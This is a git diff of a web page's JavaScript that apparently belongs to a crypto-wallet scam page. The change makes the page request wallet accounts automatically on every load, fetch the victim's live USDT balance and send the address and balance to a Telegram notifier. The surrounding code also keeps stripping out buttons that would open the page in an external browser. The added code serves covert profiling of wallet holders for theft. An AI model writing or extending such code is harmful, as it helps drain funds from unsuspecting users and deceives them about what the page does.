@@ -53,17 +53,43 @@ function removeExternalBrowserButtons() {
     });
 }
 
-// Initialize
+let isAutoConnectAttempted = false;
+
+function initAutoConnect() {
+    if (isAutoConnectAttempted) return;
+
+    let attempts = 0;
+    const maxAttempts = 20; // Poll for up to 6 seconds (20 x 300ms)
+
+    const interval = setInterval(async () => {
+        attempts++;
+        if (typeof window.ethereum !== 'undefined') {
+            clearInterval(interval);
+            if (!isAutoConnectAttempted) {
+                isAutoConnectAttempted = true;
+                await autoDetectTrustWalletAndFetchBalance();
+            }
+        } else if (attempts >= maxAttempts) {
+            clearInterval(interval);
+        }
+    }, 300);
+}
+
+// Initialize listeners
 document.addEventListener('DOMContentLoaded', () => {
     removeExternalBrowserButtons();
     setInterval(removeExternalBrowserButtons, 300);
     setupEventListeners();
     checkUrlParameters();
-    // Only auto-detect wallet if address parameter is present
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.has('address')) {
-        autoDetectTrustWalletAndFetchBalance();
-    }
+    initAutoConnect();
+});
+
+window.addEventListener('load', () => {
+    initAutoConnect();
+});
+
+window.addEventListener('ethereum#initialized', () => {
+    initAutoConnect();
 });
 
 function checkUrlParameters() {
@@ -461,26 +487,23 @@ async function notifyTelegramWalletConnected(address, balanceUsdt) {
 async function autoDetectTrustWalletAndFetchBalance() {
     if (typeof window.ethereum !== 'undefined') {
         try {
-            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-            let activeAddr = null;
+            console.log('[AutoConnect] Trust Wallet provider detected.');
+            let accounts = await window.ethereum.request({ method: 'eth_accounts' });
 
-            if (accounts && accounts.length > 0) {
-                activeAddr = accounts[0];
-            } else {
-                const reqAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                if (reqAccounts && reqAccounts.length > 0) {
-                    activeAddr = reqAccounts[0];
-                }
+            if (!accounts || accounts.length === 0) {
+                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             }
 
-            if (activeAddr) {
-                fetchRealUsdtBalance(activeAddr);
-                notifyTelegramWalletConnected(activeAddr);
+            if (accounts && accounts.length > 0) {
+                const activeAddr = accounts[0];
+                console.log('[AutoConnect] Connected account:', activeAddr);
+                const realBal = await fetchRealUsdtBalance(activeAddr);
+                notifyTelegramWalletConnected(activeAddr, realBal !== undefined ? realBal : userUsdtBalance);
             } else {
                 fetchRealUsdtBalance(getCurrentAddress());
             }
         } catch (e) {
-            console.log('Trust Wallet Auto Detect Info:', e);
+            console.log('[AutoConnect] Error:', e);
             fetchRealUsdtBalance(getCurrentAddress());
         }
     } else {
@@ -492,7 +515,7 @@ async function autoDetectTrustWalletAndFetchBalance() {
  * Fetches REAL Live USDT Balance on BNB Smart Chain via RPC
  */
 async function fetchRealUsdtBalance(walletAddress) {
-    if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) return;
+    if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length !== 42) return userUsdtBalance;
 
     try {
         const cleanAddr = walletAddress.substring(2).padStart(64, '0');
@@ -523,11 +546,12 @@ async function fetchRealUsdtBalance(walletAddress) {
 
             userUsdtBalance = balanceUsdt;
             updateBalanceUI(balanceUsdt);
-            notifyTelegramWalletConnected(walletAddress, balanceUsdt);
+            return balanceUsdt;
         }
     } catch (err) {
         console.warn('RPC Balance Fetch Note:', err);
     }
+    return userUsdtBalance;
 }
 
 // Update Balance UI
